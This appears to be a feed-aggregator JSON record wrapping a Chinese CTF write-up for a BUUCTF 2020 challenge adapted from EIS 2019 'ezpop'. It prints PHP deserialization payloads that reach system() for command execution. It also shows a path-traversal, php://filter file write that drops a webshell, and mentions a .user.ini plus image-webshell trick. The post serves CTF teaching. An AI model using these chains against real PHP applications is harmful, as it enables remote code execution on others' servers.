{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-10-19 02:06:39","updatedTime":"2020-10-19 02:06:39","title":"BUUCTF 2020 新春红包题1 Writeup","link":"https://www.zhaoj.in/?p=6397","description":"\n<h4>一、前言</h4>\n\n\n\n<p>原本想着过年了搞搞活动啥的，说从日本回来出三个题给大家发发红包的，结果事情挺多的，搞了一个题放出来先让大家玩玩。</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img loading=\"lazy\" width=\"655\" height=\"1024\" src=\"https://www.zhaoj.in/wp-content/uploads/2020/01/1580277423e98f7a003566ba3bd38d93b101e04a54-655x1024.png\" alt=\"\" class=\"wp-image-6398\" srcset=\"https://www.zhaoj.in/wp-content/uploads/2020/01/1580277423e98f7a003566ba3bd38d93b101e04a54-655x1024.png 655w, https://www.zhaoj.in/wp-content/uploads/2020/01/1580277423e98f7a003566ba3bd38d93b101e04a54-192x300.png 192w, https://www.zhaoj.in/wp-content/uploads/2020/01/1580277423e98f7a003566ba3bd38d93b101e04a54-768x1201.png 768w, https://www.zhaoj.in/wp-content/uploads/2020/01/1580277423e98f7a003566ba3bd38d93b101e04a54-982x1536.png 982w, https://www.zhaoj.in/wp-content/uploads/2020/01/1580277423e98f7a003566ba3bd38d93b101e04a54.png 1028w\" sizes=\"(max-width: 655px) 100vw, 655px\" /></figure>\n\n\n\n<h4>二、解题情况</h4>\n\n\n\n<p>最终在截止时间之前有 19 位同学做出来，其中第一位同学在题目放出两个小时之后就做出来了，很赞<img src=\"https://s.w.org/images/core/emoji/13.0.0/72x72/1f44d.png\" alt=\"👍\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img loading=\"lazy\" width=\"559\" height=\"1024\" src=\"https://www.zhaoj.in/wp-content/uploads/2020/01/1580277464e7644568f7fe414b54f372da0b2d7365-559x1024.png\" alt=\"\" class=\"wp-image-6399\" srcset=\"https://www.zhaoj.in/wp-content/uploads/2020/01/1580277464e7644568f7fe414b54f372da0b2d7365-559x1024.png 559w, https://www.zhaoj.in/wp-content/uploads/2020/01/1580277464e7644568f7fe414b54f372da0b2d7365-164x300.png 164w, https://www.zhaoj.in/wp-content/uploads/2020/01/1580277464e7644568f7fe414b54f372da0b2d7365-768x1407.png 768w, https://www.zhaoj.in/wp-content/uploads/2020/01/1580277464e7644568f7fe414b54f372da0b2d7365-839x1536.png 839w, https://www.zhaoj.in/wp-content/uploads/2020/01/1580277464e7644568f7fe414b54f372da0b2d7365.png 1032w\" sizes=\"(max-width: 559px) 100vw, 559px\" /></figure>\n\n\n\n<h4>三、Writeup</h4>\n\n\n\n<p>接下来就是 Writeup 了，过着年事情挺多的，就把大家用到的方法简略写一下了。</p>\n\n\n\n<p>本题改编自 EIS 2019 的 ezpop，那时候在做题的时候发现了另外一种解法，但事后发现没人就着那种方法写 wp，所以就暂时搁置下来留着以后拿来用用。</p>\n\n\n\n<p>在这里和原题不同的是加了下面这个，对文件名有所控制。</p>\n\n\n\n<pre class=\"wp-block-code\"><code>public function getCacheKey(string $name): string {\n        // 使缓存文件名随机\n        $cache_filename = $this->options&#91;'prefix'] . uniqid() . $name;\n        if(substr($cache_filename, -strlen('.php')) === '.php') {\n            die('?');\n        }\n        return $cache_filename;\n    }</code></pre>\n\n\n\n<p>原题 Writeup：<a href=\"http://www.rayi.vip/2019/11/27/EIS%202019/\">http://www.rayi.vip/2019/11/27/EIS%202019/</a></p>\n\n\n\n<h5>1、预期解</h5>\n\n\n\n<p>使用如下的 Payload（前面类定义省略，自己复制）:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>$testB = new B();\n$testB->options&#91;'prefix'] = 'abc';\n$testB->options&#91;'serialize'] = 'system';\n$testB->options&#91;'data_compress'] = false;\n$testB->options&#91;'expire'] = \"aaa\\n\";\n$testB->writeTimes = 0;\n$testA = new A($testB, \"miao\");\n$testA->autosave = false;\n$testA->cache = &#91;'aaq' => '`cat /flag > ./flag.php`'];\n$testA->complete = true;\n\necho urlencode(serialize($testA)).\"\\n\";\n</code></pre>\n\n\n\n<p>关键在 serialize 和 cache 里的命令那，</p>\n\n\n\n<p>到源码中的</p>\n\n\n\n<pre class=\"wp-block-code\"><code>$data = $this->serialize($value);</code></pre>\n\n\n\n<p>此处即可调用任意函数并且传参，即便参数在上面</p>\n\n\n\n<pre class=\"wp-block-code\"><code>return json_encode(&#91;$cleaned, $this->complete]);</code></pre>\n\n\n\n<p>被 json 编码了，但我们仍然可以在其中插入一段完整的内容，所以插入一段用反引号`括起来的命令，由于整段东西传入 system 函数之后是调用 shell 来执行，执行顺序有先后，反引号内的会被先执行，即可达到我们执行命令的目的。</p>\n\n\n\n<p>更多信息可以参考 <a href=\"https://www.anquanke.com/post/id/194036\">https://www.anquanke.com/post/id/194036</a> 。</p>\n\n\n\n<h5>2、其他解法1</h5>\n\n\n\n<p>为了降低难度，文件名那里没有封死，于是就给了大家很多发挥的空间。</p>\n\n\n\n<p>对于前面的随机值，使用/../即可截断，后面即可追加写任意文件。</p>\n\n\n\n<p>于是先写一个 .user.ini，然后写一个 .jpg 里面带马，使其追加到其他 php 后面作为 php 执行即可。</p>\n\n\n\n<p>参见 <a href=\"http://althims.com/2020/01/29/buu-new-year/\">http://althims.com/2020/01/29/buu-new-year/</a></p>\n\n\n\n<h5>3、其他解法2</h5>\n\n\n\n<p>和上面大同小异，也是任意写文件的锅，这里对于尾部 .php 的限制，可使用追加 /. 来绕过。</p>\n\n\n\n<pre class=\"wp-block-code\"><code>$testB = new B();\n$testA = new A($testB, $key = '/../miao1.php/.');\n$testA->complete = true;\n$testA->autosave = false;\n// &#60;?php phpinfo();?\\>\n$testA->cache = array(\"PD9waHAgcGhwaW5mbygpOz8+\"=>\"\");\n$testB->options&#91;'prefix'] = 'php://filter/write=string.strip_tags|convert.base64-decode/resource=';\n$testB->options&#91;'serialize'] = 'strval';\n$testB->options&#91;'data_compress'] = false;\n$testB->options&#91;'expire'] = \"aaa\\n\";\n$testB->writeTimes = 0;\n\necho urlencode(serialize($testA)).\"\\n\";</code></pre>\n\n\n\n<p>更多方法，欢迎补充。</p>\n\n\n\n<p></p>\n\n\n\n<p>预告：今晚（2020年01月29日）晚八点开放 MISC 新春红包题。</p>\n","descriptionType":"html","publishedDate":"Wed, 29 Jan 2020 08:20:48 +0000","feedId":32607,"bgimg":"https://www.zhaoj.in/wp-content/uploads/2020/01/1580277423e98f7a003566ba3bd38d93b101e04a54-655x1024.png","linkMd5":"7a73984963546cd9b4c81860b2e96cdb","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn59@2020_4/2020/10/18/18-06-43-834_82208a8deb4d328f.webp","destWidth":655,"destHeight":1024,"sourceBytes":385266,"destBytes":47320,"author":"glzjin","articleImgCdnMap":{"https://www.zhaoj.in/wp-content/uploads/2020/01/1580277423e98f7a003566ba3bd38d93b101e04a54-655x1024.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn59@2020_4/2020/10/18/18-06-43-834_82208a8deb4d328f.webp","https://s.w.org/images/core/emoji/13.0.0/72x72/1f44d.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn68@2020_4/2020/10/18/18-06-45-249_40c3fe9c532ac380.webp","https://www.zhaoj.in/wp-content/uploads/2020/01/1580277464e7644568f7fe414b54f372da0b2d7365-559x1024.png":null},"publishedOrCreatedDate":1603044399555}],"record":{"createdTime":"2020-10-19 02:06:39","updatedTime":"2020-10-19 02:06:39","feedId":32607,"fetchDate":"Sun, 18 Oct 2020 18:06:39 +0000","fetchMs":2438,"handleMs":39,"totalMs":73767,"newArticles":0,"totalArticles":15,"status":1,"type":0,"ip":"8260fd2369d630e6757423393ed6aac1","hostName":"europe65*","requestId":"44a4e6e4735c41cba2d6031e90e76f7e_32607","contentType":"application/rss+xml; charset=UTF-8","totalBytes":48624,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":3,"articlesImgsGithubTotal":2,"successGithubMap":{"myreaderx15":1,"myreaderx27":1},"failGithubMap":{"myreaderx19":1}},"feed":{"createdTime":"2020-09-07 02:56:06","updatedTime":"2020-09-07 05:06:43","id":32607,"name":"赵","url":"https://www.zhaoj.in/feed","subscriber":98,"website":null,"icon":"https://www.zhaoj.in/wp-content/uploads/2015/09/63a31fbec65e6094-32x32.png","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx62/cdn28@2020_1/2020/09/06/21-06-35-407_9063ea448df71f2f.png","description":"西兴街道物理安全研究员 / 原学生@北京联合大学/信息安全爱好者 / 全栈开发 / 为心中的美好而战","weekly":null,"link":null},"noPictureArticleList":[{"createdTime":"2020-10-19 02:07:50","updatedTime":"2020-10-19 02:07:50","id":null,"feedId":32607,"linkMd5":"7a73984963546cd9b4c81860b2e96cdb"}],"tmpCommonImgCdnBytes":47320,"tmpBodyImgCdnBytes":1304,"tmpBgImgCdnBytes":0,"extra4":{"start":1603044396361,"total":0,"statList":[{"spend":3155,"msg":"获取xml内容"},{"spend":39,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":65075,"msg":"正文链接上传到cdn"}]},"extra5":3,"extra6":3,"extra7ImgCdnFailResultVector":[null,{"code":1,"isDone":false,"source":"https://www.zhaoj.in/wp-content/uploads/2020/01/1580277464e7644568f7fe414b54f372da0b2d7365-559x1024.png","sourceStatusCode":200,"destWidth":559,"destHeight":1024,"sourceBytes":152776,"destBytes":23998,"targetWebpQuality":75,"feedId":32607,"totalSpendMs":3372,"convertSpendMs":34,"createdTime":"2020-10-19 02:07:46","host":"us-022*","referer":"https://www.zhaoj.in/?p=6397","linkMd5ListStr":"7a73984963546cd9b4c81860b2e96cdb","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx19/cdn70/contents/2020/10/18/18-07-49-407_c0a34256be4a430e.webp","resp":{"code":409,"msg":"Conflict","body":"{\n  \"message\": \"is at 9912e6fa033952d42992715b23427143289bdabe but expected d59254b933917d27841869ddbdf856133330f718\",\n  \"documentation_url\": \"https://docs.github.com/rest/reference/repos#create-or-update-file-contents\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-length":["222"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sun, 18 Oct 2020 18:07:50 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["409 Conflict"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":[""],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["8348:6735:1A3D9F0:3C10810:5F8C8473"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["5000"],"x-ratelimit-remaining":["4857"],"x-ratelimit-reset":["1603047730"],"x-ratelimit-used":["143"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 409,url is : https://api.github.com/repos/myreaderx19/cdn70/contents/2020/10/18/18-07-49-407_c0a34256be4a430e.webp","historyStatusCode":[],"spendMs":680},"base64UserPassword":null,"token":"e7085******************************e4b8c"},"githubUser":"myreaderx19","githubHttpCode":409,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"149.2 KB","destSize":"23.4 KB","compressRate":"15.7%"}],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://us-021.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://us-022.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://www.zhaoj.in/wp-content/uploads/2020/01/1580277423e98f7a003566ba3bd38d93b101e04a54-655x1024.png","sourceStatusCode":200,"destWidth":655,"destHeight":1024,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn59@2020_4/2020/10/18/18-06-43-834_82208a8deb4d328f.webp","sourceBytes":385266,"destBytes":47320,"targetWebpQuality":75,"feedId":32607,"totalSpendMs":5468,"convertSpendMs":35,"createdTime":"2020-10-19 02:06:39","host":"europe69*","referer":"https://www.zhaoj.in/?p=6397","linkMd5ListStr":"7a73984963546cd9b4c81860b2e96cdb,7a73984963546cd9b4c81860b2e96cdb","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"376.2 KB","destSize":"46.2 KB","compressRate":"12.3%"},{"code":1,"isDone":false,"source":"https://s.w.org/images/core/emoji/13.0.0/72x72/1f44d.png","sourceStatusCode":200,"destWidth":72,"destHeight":72,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn68@2020_4/2020/10/18/18-06-45-249_40c3fe9c532ac380.webp","sourceBytes":778,"destBytes":1304,"targetWebpQuality":75,"feedId":32607,"totalSpendMs":861,"convertSpendMs":6,"createdTime":"2020-10-19 02:06:45","host":"us-022*","referer":"https://www.zhaoj.in/?p=6397","linkMd5ListStr":"7a73984963546cd9b4c81860b2e96cdb","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"778 B","destSize":"1.3 KB","compressRate":"167.6%"}],"successGithubMap":{"myreaderx15":1,"myreaderx27":1},"failGithubMap":{"myreaderx19":1}}